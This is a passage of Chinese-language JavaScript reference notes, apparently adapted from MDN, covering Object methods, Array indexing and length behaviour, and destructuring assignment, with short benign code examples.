<p>使用对象强制转换的地方包括：</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in"><code>for...in</code></a> 循环的 <code>object</code> 参数。</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array"><code>Array</code></a> 方法的 <code>this</code> 值。</li>
<li><code>Object</code> 方法的参数，如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys"><code>Object.keys()</code></a>。</li>
<li>当访问基本类型的属性时进行自动转换，因为基本类型没有属性。</li>
<li>在调用非严格函数时的 <code>this</code> 值。基本类型值被封装为对象，而 <code>null</code> 和 <code>undefined</code> 被替换为<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Global_object">全局对象</a>。</li>
</ul>
<p>与<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures#%E5%BC%BA%E5%88%B6%E5%8E%9F%E5%A7%8B%E5%80%BC%E8%BD%AC%E6%8D%A2">转换为基本类型</a>不同，对象强制转换过程本身无法以任何方式被观察到，因为它不会调用像 <code>toString</code> 或 <code>valueOf</code> 方法这样的自定义代码。</p>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">构造函数</a></h2><ul>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/Object"><code>Object()</code></a></p>
<p>​    将输入转换为一个对象。</p>
</li>
</ul>
<h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95">静态方法</a></h2><ul>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign"><code>Object.assign()</code></a></p>
<p>​    将一个或多个源对象的所有可枚举自有属性的值复制到目标对象中。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create"><code>Object.create()</code></a></p>
<p>​    使用指定的原型对象和属性创建一个新对象。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperties"><code>Object.defineProperties()</code></a></p>
<p>​    向对象添加多个由给定描述符描述的命名属性。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty"><code>Object.defineProperty()</code></a></p>
<p>​    向对象添加一个由给定描述符描述的命名属性。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/entries"><code>Object.entries()</code></a></p>
<p>​    返回包含给定对象<strong>自有</strong>可枚举字符串属性的所有 <code>[key, value]</code> 数组。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze"><code>Object.freeze()</code></a></p>
<p>​    冻结一个对象。其他代码不能删除或更改其任何属性。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/fromEntries"><code>Object.fromEntries()</code></a></p>
<p>​    从一个包含 <code>[key, value]</code> 对的可迭代对象中返回一个新的对象（<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/entries"><code>Object.entries</code></a> 的反操作）。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor"><code>Object.getOwnPropertyDescriptor()</code></a></p>
<p>​    返回一个对象的已命名属性的属性描述符。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptors"><code>Object.getOwnPropertyDescriptors()</code></a></p>
<p>​    返回一个包含对象所有自有属性的属性描述符的对象。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyNames"><code>Object.getOwnPropertyNames()</code></a></p>
<p>​    返回一个包含给定对象的所有<strong>自有</strong>可枚举和不可枚举属性名称的数组。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertySymbols"><code>Object.getOwnPropertySymbols()</code></a></p>
<p>​    返回一个数组，它包含了指定对象所有自有 symbol 属性。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf"><code>Object.getPrototypeOf()</code></a></p>
<p>​    返回指定对象的原型（内部的 <code>[[Prototype]]</code> 属性）。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn"><code>Object.hasOwn()</code></a></p>
<p>​    如果指定属性是指定对象的自有属性，则返回 <code>true</code>，否则返回 <code>false</code>。如果该属性是继承的或不存在，则返回 <code>false</code>。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/is"><code>Object.is()</code></a></p>
<p>​    比较两个值是否相同。所有 <code>NaN</code> 值都相等（这与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Equality"><code>==</code></a> 使用的 <code>IsLooselyEqual</code> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Strict_equality"><code>===</code></a> 使用的 <code>IsStrictlyEqual</code> 不同）。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isExtensible"><code>Object.isExtensible()</code></a></p>
<p>​    判断对象是否可扩展。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isFrozen"><code>Object.isFrozen()</code></a></p>
<p>​    判断对象是否已经冻结。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isSealed"><code>Object.isSealed()</code></a></p>
<p>​    判断对象是否已经封闭。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys"><code>Object.keys()</code></a></p>
<p>​    返回一个包含所有给定对象<strong>自有</strong>可枚举字符串属性名称的数组。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/preventExtensions"><code>Object.preventExtensions()</code></a></p>
<p>​    防止对象的任何扩展。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/seal"><code>Object.seal()</code></a></p>
<p>​    防止其他代码删除对象的属性。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf"><code>Object.setPrototypeOf()</code></a></p>
<p>​    设置对象的原型（即内部 <code>[[Prototype]]</code> 属性）。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/values"><code>Object.values()</code></a></p>
<p>​    返回包含给定对象所有<strong>自有</strong>可枚举字符串属性的值的数组。</p>
</li>
</ul>
<h2 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7">实例属性</a></h2><p>这些属性在 <code>Object.prototype</code> 上定义，被所有 <code>Object</code> 实例所共享。</p>
<ul>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto"><code>Object.prototype.__proto__</code></a>   已弃用</p>
<p>​    指向实例对象在实例化时使用的原型对象。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor"><code>Object.prototype.constructor</code></a></p>
<p>​    创建该实例对象的构造函数。对于普通的 <code>Object</code> 实例，初始值为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/Object"><code>Object</code></a> 构造函数。其它构造函数的实例都会从它们各自的 <code>Constructor.prototype</code> 对象中继承 <code>constructor</code> 属性。</p>
</li>
</ul>
<h2 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95">实例方法</a></h2><ul>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineGetter__"><code>Object.prototype.__defineGetter__()</code></a>   已弃用</p>
<p>​    将一个属性与一个函数相关联，当该属性被访问时，执行该函数，并且返回函数的返回值。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__"><code>Object.prototype.__defineSetter__()</code></a>   已弃用</p>
<p>​    将一个属性与一个函数相关联，当该属性被设置时，执行该函数，执行该函数去修改某个属性。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__lookupGetter__"><code>Object.prototype.__lookupGetter__()</code></a>   已弃用</p>
<p>​    返回绑定在指定属性上的 getter 函数。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__lookupSetter__"><code>Object.prototype.__lookupSetter__()</code></a>   已弃用</p>
<p>​    返回绑定在指定属性上的 setter 函数。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwnProperty"><code>Object.prototype.hasOwnProperty()</code></a></p>
<p>​    返回一个布尔值，用于表示一个对象自身是否包含指定的属性，该方法并不会查找原型链上继承来的属性。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isPrototypeOf"><code>Object.prototype.isPrototypeOf()</code></a></p>
<p>​    返回一个布尔值，用于表示该方法所调用的对象是否在指定对象的原型链中。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/propertyIsEnumerable"><code>Object.prototype.propertyIsEnumerable()</code></a></p>
<p>​    返回一个布尔值，指示指定属性是否是对象的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Enumerability_and_ownership_of_properties">可枚举自有属性</a>。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toLocaleString"><code>Object.prototype.toLocaleString()</code></a></p>
<p>​    调用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString"><code>toString()</code></a> 方法。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString"><code>Object.prototype.toString()</code></a></p>
<p>​    返回一个代表该对象的字符串。  </p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf"><code>Object.prototype.valueOf()</code></a></p>
<p>​    返回指定对象的基本类型值。</p>
</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E7%A4%BA%E4%BE%8B">示例</a></h2><h3 id="构造空对象"><a href="#构造空对象" class="headerlink" title="构造空对象"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E6%9E%84%E9%80%A0%E7%A9%BA%E5%AF%B9%E8%B1%A1">构造空对象</a></h3><p>以下示例使用带有不同参数的 <code>new</code> 关键字创建空对象：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> o1 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="keyword">const</span> o2 = <span class="keyword">new</span> <span class="title class_">Object</span>(<span class="literal">undefined</span>);</span><br><span class="line"><span class="keyword">const</span> o3 = <span class="keyword">new</span> <span class="title class_">Object</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<h3 id="使用-Object-生成布尔对象"><a href="#使用-Object-生成布尔对象" class="headerlink" title="使用 Object 生成布尔对象"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E4%BD%BF%E7%94%A8_object_%E7%94%9F%E6%88%90%E5%B8%83%E5%B0%94%E5%AF%B9%E8%B1%A1">使用 <code>Object</code> 生成布尔对象</a></h3><p>下面的例子将 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean"><code>Boolean</code></a> 对象存到 <code>o</code> 中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等价于 const o = new Boolean(true);</span></span><br><span class="line"><span class="keyword">const</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等价于 const o = new Boolean(false);</span></span><br><span class="line"><span class="keyword">const</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>(<span class="title class_">Boolean</span>());</span><br></pre></td></tr></table></figure>

<h1 id="Array-数组"><a href="#Array-数组" class="headerlink" title="Array(数组)"></a>Array(数组)</h1><p>与其他编程语言中的数组一样，**<code>Array</code>** 对象支持<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/First_steps/Arrays">在单个变量名下存储多个元素</a>，并具有<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array#%E7%A4%BA%E4%BE%8B">执行常见数组操作</a>的成员。</p>
<h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array#%E6%8F%8F%E8%BF%B0">描述</a></h2><p>在 JavaScript 中，数组不是<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Primitive">基本类型</a>，而是具有以下核心特征的 <code>Array</code> 对象：</p>
<ul>
<li>**JavaScript 数组是可调整大小的，并且可以包含不同的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures">数据类型</a>**。（当不需要这些特征时，可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Typed_arrays">类型化数组</a>。）</li>
<li><strong>JavaScript 数组不是关联数组</strong>，因此，不能使用任意字符串作为索引访问数组元素，但必须使用非负整数（或它们各自的字符串形式）作为索引访问。</li>
<li>**JavaScript 数组的<a href="https://zh.wikipedia.org/zh-cn/%E5%BE%9E%E9%9B%B6%E9%96%8B%E5%A7%8B%E7%9A%84%E7%B7%A8%E8%99%9F">索引从 0 开始</a>**：数组的第一个元素在索引 <code>0</code> 处，第二个在索引 <code>1</code> 处，以此类推，最后一个元素是数组的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a> 属性减去 <code>1</code> 的值。</li>
<li>**JavaScript <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array#%E5%A4%8D%E5%88%B6%E6%95%B0%E7%BB%84">数组复制操作</a>创建<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Shallow_copy">浅拷贝</a>*<em>。（</em>所有* JavaScript 对象的标准内置复制操作都会创建浅拷贝，而不是<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Deep_copy">深拷贝</a>）。</li>
</ul>
<h3 id="数组下标"><a href="#数组下标" class="headerlink" title="数组下标"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array#%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87">数组下标</a></h3><p><code>Array</code> 对象不能使用任意字符串作为元素索引（如<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84">关联数组</a>），必须使用非负整数（或它们的字符串形式）。通过非整数设置或访问不会设置或从数组列表本身检索元素，但会设置或访问与该数组的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures#%E5%B1%9E%E6%80%A7">对象属性集合</a>相关的变量。数组的对象属性和数组元素列表是分开的，数组的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Indexed_collections#%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95">遍历和修改操作</a>不能应用于这些命名属性。</p>
<p>数组元素是对象属性，就像 <code>toString</code> 是属性一样（具体来说，<code>toString()</code> 是一种方法）。然而，尝试按以下方式访问数组的元素会抛出语法错误，因为属性名无效：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr<span class="number">.0</span>); <span class="comment">// 语法错误</span></span><br></pre></td></tr></table></figure>

<p>JavaScript 语法要求使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Working_with_objects#%E5%AF%B9%E8%B1%A1%E5%92%8C%E5%B1%9E%E6%80%A7">方括号表示法</a>而不是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Property_accessors">点号表示法</a>来访问以数字开头的属性。也可以用引号包裹数组下标（例如，<code>years[&#39;2&#39;]</code> 而不是 <code>years[2]</code>），尽管通常没有必要。</p>
<p>JavaScript 引擎通过隐式的 <code>toString</code>，将 <code>years[2]</code> 中的 <code>2</code> 强制转换为字符串。因此，<code>&#39;2&#39;</code> 和 <code>&#39;02&#39;</code> 将指向 <code>years</code> 对象上的两个不同的槽位，下面的例子可能是 <code>true</code>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(years[<span class="string">&quot;2&quot;</span>] !== years[<span class="string">&quot;02&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>只有 <code>years[&#39;2&#39;]</code> 是一个实际的数组索引。<code>years[&#39;02&#39;]</code> 是一个在数组迭代中不会被访问的任意字符串属性。</p>
<h3 id="长度与数值属性的关系"><a href="#长度与数值属性的关系" class="headerlink" title="长度与数值属性的关系"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array#%E9%95%BF%E5%BA%A6%E4%B8%8E%E6%95%B0%E5%80%BC%E5%B1%9E%E6%80%A7%E7%9A%84%E5%85%B3%E7%B3%BB">长度与数值属性的关系</a></h3><p>JavaScript 数组的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a> 属性和数值属性是连接的。</p>
<p>一些内置数组方法（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/join"><code>join()</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/slice"><code>slice()</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/indexOf"><code>indexOf()</code></a> 等）在被调用时会考虑到数组的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a> 属性的值。</p>
<p>其他方法（例如，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/push"><code>push()</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/splice"><code>splice()</code></a> 等）也会更新数组的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a> 属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fruits = [];</span><br><span class="line">fruits.<span class="title function_">push</span>(<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;peach&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits.<span class="property">length</span>); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<p>当在 JavaScript 数组上设置一个属性时，如果该属性是一个有效的数组索引并且该索引在数组的当前边界之外，引擎将相应地更新数组的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a> 属性：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">fruits[<span class="number">5</span>] = <span class="string">&quot;mango&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits[<span class="number">5</span>]); <span class="comment">// &#x27;mango&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(fruits)); <span class="comment">// [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;5&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits.<span class="property">length</span>); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>

<p>增加 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">fruits.<span class="property">length</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits); <span class="comment">// [&#x27;banana&#x27;, &#x27;apple&#x27;, &#x27;peach&#x27;, empty x 2, &#x27;mango&#x27;, empty x 4]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(fruits)); <span class="comment">// [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;5&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits.<span class="property">length</span>); <span class="comment">// 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits[<span class="number">8</span>]); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>但是，减少 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a> 属性会删除元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">fruits.<span class="property">length</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(fruits)); <span class="comment">// [&#x27;0&#x27;, &#x27;1&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits.<span class="property">length</span>); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<p>这将在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>Array/length</code></a> 页中进一步解释</p>
<h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><p><strong>解构赋值</strong>语法是一种 Javascript 表达式。可以将数组中的值或对象的属性取出，赋值给其他变量。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E8%AF%AD%E6%B3%95">语法</a></h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b] = array;</span><br><span class="line"><span class="keyword">const</span> [a, , b] = array;</span><br><span class="line"><span class="keyword">const</span> [a = aDefault, b] = array;</span><br><span class="line"><span class="keyword">const</span> [a, b, ...rest] = array;</span><br><span class="line"><span class="keyword">const</span> [a, , b, ...rest] = array;</span><br><span class="line"><span class="keyword">const</span> [a, b, ...&#123; pop, push &#125;] = array;</span><br><span class="line"><span class="keyword">const</span> [a, b, ...[c, d]] = array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; a, b &#125; = obj;</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">a</span>: a1, <span class="attr">b</span>: b1 &#125; = obj;</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">a</span>: a1 = aDefault, b = bDefault &#125; = obj;</span><br><span class="line"><span class="keyword">const</span> &#123; a, b, ...rest &#125; = obj;</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">a</span>: a1, <span class="attr">b</span>: b1, ...rest &#125; = obj;</span><br><span class="line"><span class="keyword">const</span> &#123; [key]: a &#125; = obj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a, b, a1, b1, c, d, rest, pop, push;</span><br><span class="line">[a, b] = array;</span><br><span class="line">[a, , b] = array;</span><br><span class="line">[a = aDefault, b] = array;</span><br><span class="line">[a, b, ...rest] = array;</span><br><span class="line">[a, , b, ...rest] = array;</span><br><span class="line">[a, b, ...&#123; pop, push &#125;] = array;</span><br><span class="line">[a, b, ...[c, d]] = array;</span><br><span class="line"></span><br><span class="line">(&#123; a, b &#125; = obj); <span class="comment">// brackets are required</span></span><br><span class="line">(&#123; <span class="attr">a</span>: a1, <span class="attr">b</span>: b1 &#125; = obj);</span><br><span class="line">(&#123; <span class="attr">a</span>: a1 = aDefault, b = bDefault &#125; = obj);</span><br><span class="line">(&#123; a, b, ...rest &#125; = obj);</span><br><span class="line">(&#123; <span class="attr">a</span>: a1, <span class="attr">b</span>: b1, ...rest &#125; = obj);</span><br></pre></td></tr></table></figure>

<h2 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E6%8F%8F%E8%BF%B0">描述</a></h2><p>对象和数组字面量表达式提供了一种简单的方法来创建<em>特别的</em>数据包。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br></pre></td></tr></table></figure>

<p>解构赋值使用类似的语法，但在赋值的左侧定义了要从原变量中取出哪些值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">const</span> [y, z] = x;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<p>同样，你可以在赋值语句的左侧解构对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> &#123; a, b &#125; = obj;</span><br><span class="line"><span class="comment">// is equivalent to:</span></span><br><span class="line"><span class="comment">// const a = obj.a;</span></span><br><span class="line"><span class="comment">// const b = obj.b;</span></span><br></pre></td></tr></table></figure>

<p>这种功能类似于 Perl 和 Python 等语言中存在的特性。</p>
<h3 id="绑定与赋值"><a href="#绑定与赋值" class="headerlink" title="绑定与赋值"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E7%BB%91%E5%AE%9A%E4%B8%8E%E8%B5%8B%E5%80%BC">绑定与赋值</a></h3><p>对于对象和数组的解构，有两种解构模式：<em>绑定模式</em>和<em>赋值模式</em>，它们的语法略有不同。</p>
<p>在绑定模式中，模式以声明关键字（<code>var</code>、<code>let</code> 或 <code>const</code>）开始。然后，每个单独的属性必须绑定到一个变量或进一步解构。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: &#123; <span class="attr">c</span>: <span class="number">2</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">  a,</span><br><span class="line">  <span class="attr">b</span>: &#123; <span class="attr">c</span>: d &#125;,</span><br><span class="line">&#125; = obj;</span><br><span class="line"><span class="comment">// Two variables are bound: `a` and `d`</span></span><br></pre></td></tr></table></figure>

<p>所有变量共享相同的声明，因此，如果你希望某些变量可重新分配，而其他变量是只读的，则可能需要解构两次——一次使用 <code>let</code>，一次使用 <code>const</code>。</p>
